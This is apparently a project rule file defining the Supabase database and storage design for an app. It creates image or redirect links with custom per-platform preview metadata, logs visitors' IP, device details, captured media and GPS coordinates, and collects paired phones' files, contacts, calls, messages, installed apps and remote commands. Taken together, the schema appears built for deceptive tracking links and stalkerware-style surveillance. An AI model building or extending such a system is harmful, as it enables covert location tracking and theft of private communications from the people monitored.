# Rule 04: Database Architecture & Supabase Storage

## 1. Database Domain Tables
All database tables must use UUIDs, UTC timestamps (`TIMESTAMPTZ`), foreign keys with cascade rules, and query indexes.

Key table requirements:
- **`image_links`**: `id`, `slug`, `image_path`, `target_url`, `link_type` ('image' | 'redirect' | 'hybrid'), `og_title`, `og_description`, `og_image_url`, `og_platform`, `permissions_config` (JSONB), `title`, `description`, `is_active`, `requires_location`, `expires_at`, `created_at`.
- **`location_sessions`**: `id`, `link_id`, `consent_at`, `started_at`, `ended_at`, `status`, `ip_address`, `user_agent`, `device_info` (JSONB: OS, browser, battery %, timezone), `permissions_granted`, `captured_media_path`, `captured_data`.
- **`location_updates`**: `id`, `session_id`, `latitude`, `longitude`, `accuracy`, `created_at` with coordinate range CHECK constraints.
- **`monitored_devices`**: `id`, `pairing_code`, `device_name`, `device_model`, `battery_level`, `is_online`, `last_seen_at`.
- **Telemetry Tables**: `device_locations`, `device_files`, `device_contacts`, `device_calls`, `device_messages`, `device_installed_apps`, `device_commands`.
  - Must enforce unique constraints (`uq_device_files_path`, `uq_device_contacts_name`, `uq_device_calls`, `uq_device_messages`, `uq_device_package`) to guarantee 0% duplicate rows.

## 2. Row Level Security (RLS)
- Enable RLS on all private and telemetry tables.
- Public visitors may only read active links via safe API endpoints; they must never access location histories or session audits.
- Authorized admin (matching `ADMIN_EMAIL`) has full access via Supabase Auth.

## 3. Storage Bucket: `snap-images`
- Bucket name: `snap-images` (public read, authenticated/admin write).
- File size limit: 25MB (`26214400` bytes).
- Allowed MIME types:
  - Images: `image/jpeg`, `image/png`, `image/webp`, `image/gif`
  - Audio: `audio/mp4`, `audio/m4a`, `audio/aac`, `audio/mpeg`, `audio/3gpp`, `audio/amr`
  - Video: `video/mp4`
  - Documents: `application/pdf`, `text/vcard`, `text/plain`
- Validation on upload:
  - Cryptographically safe UUID filename (`crypto.randomUUID()`).
  - Sanitize extension (`jpeg`, `jpg`, `png`, `webp`, `gif`, `m4a`, `mp4`, `3gp`, `amr`, `aac`, `webm`, `vcf`). Never trust original client filenames.
